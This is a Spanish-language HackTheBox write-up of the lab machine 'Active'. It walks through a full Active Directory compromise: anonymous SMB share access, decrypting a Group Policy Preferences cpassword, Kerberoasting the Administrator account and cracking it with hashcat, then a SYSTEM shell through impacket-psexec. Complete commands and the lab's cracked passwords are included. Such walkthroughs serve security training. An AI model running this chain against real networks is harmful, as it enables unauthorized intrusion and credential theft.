00 — Overview

Resumen Ejecutivo

Active es una máquina clásica de HackTheBox que ilustra dos vectores históricos pero todavía relevantes en auditorías AD: las GPP Passwords (Group Policy Preferences), vulnerabilidad conocida desde 2014 (MS14-025), y el Kerberoasting del account Administrator.

La gracia de esta máquina es la limpieza de la cadena: desde cero credenciales hasta SYSTEM en cuatro pasos sin exploits, solo abuso de configuraciones y protocolos AD.

Attack Path
SMB null session → Replication share → Groups.xml GPP cpassword → gpp-decrypt → SVC_TGS creds → Kerberoasting Administrator → hashcat TGS-REP → Ticketmaster1968 → impacket-psexec → SYSTEM
01 — Recon

Nmap — DC antiguo, Windows Server 2008 R2

Fase 01
OS antiguo — mayor superficie de ataque potencial

El DNS fingerprint revela Microsoft DNS 6.1.7601, correspondiente a Windows Server 2008 R2 SP1. Un sistema operativo EOL con una superficie de ataque históricamente amplia. No hay MSSQL ni WinRM, el vector principal es SMB.

53/tcp  open  domain  Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp  open  kerberos-sec
389/tcp open  ldap    active.htb
445/tcp open  microsoft-ds
# Sin WinRM (5985) ni MSSQL — foco en SMB + Kerberos
02 — SMB

Null session — Share Replication accesible

Fase 02
Sesion nula → Replication share → volcado recursivo de SYSVOL

La sesión nula (usuario vacío, sin contraseña) permite listar shares. El share Replication contiene una cópia del SYSVOL del dominio. Se descarga todo el contenido recursivamente para análisis offline.

nxc smb 10.129.17.241 -u '' -p '' --shares
Replication   READ

smbclient //active.htb/Replication -N -c "recurse; prompt; mget *"
# Descarga Groups.xml, Registry.pol, GPT.INI y GptTmpl.inf
03 — GPP Password

Groups.xml — cpassword cifrada con AES-256 (clave pública de Microsoft)

Fase 03
Groups.xml revela cpassword de SVC_TGS — gpp-decrypt la descifra

El archivo Groups.xml dentro de la GPO contiene el campo cpassword, que es la contraseña cifrada con AES-256 usando una clave que Microsoft publicó en 2012 en su documentación MSDN. Desde entonces cualquier atacante puede descifrarla. La herramienta gpp-decrypt lo hace automáticamente.

# Groups.xml encontrado en Policies/{GPO-UUID}/MACHINE/Preferences/Groups/
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLf..."
userName="active.htb\SVC_TGS"

gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLf..."
GPPstillStandingStrong2k18
04 — Kerberoasting

GetUserSPNs — TGS-REP del Administrator → hashcat

Fase 04
SVC_TGS puede pedir TGS para Administrator (SPN activo) → TGS-REP crackeable

Con las credenciales de SVC_TGS, pedimos los SPNs del dominio. El Administrator tiene un SPN active/CIFS:445, lo que lo hace Kerberoasteable: cualquier usuario del dominio puede solicitar su TGS-REP y crackearlo offline sin alertar al DC.

impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.17.241
active/CIFS:445   Administrator

impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.17.241 -request-user Administrator
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e39da0a9...

hashcat Administrator_hash.txt /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*Administrator$...: Ticketmaster1968
05 — Root

impacket-psexec → NT AUTHORITY\SYSTEM

Fase 05
Sin WinRM disponible — psexec vía SMB con Administrator

Al no haber WinRM activo, usamos impacket-psexec que sube un ejecutable temporal al share ADMIN$ y crea un servicio para obtener shell. El acceso se consigue directamente como SYSTEM, sin necesidad de escalar desde Administrator.

nxc smb 10.129.17.241 -u Administrator -p Ticketmaster1968
[+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.17.241
